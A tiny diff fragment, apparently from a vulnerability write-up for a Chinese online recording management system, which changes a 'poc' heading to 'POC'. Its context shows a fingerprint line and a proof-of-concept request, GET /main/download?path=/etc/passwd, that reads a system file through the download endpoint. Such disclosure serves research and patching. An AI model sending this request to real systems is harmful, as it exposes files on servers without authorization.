@@ -8,7 +8,7 @@
 title="在线录音管理系统"
 ```
 
-## poc
+## POC
 
 ```
 GET /main/download?path=/etc/passwd HTTP/1.1
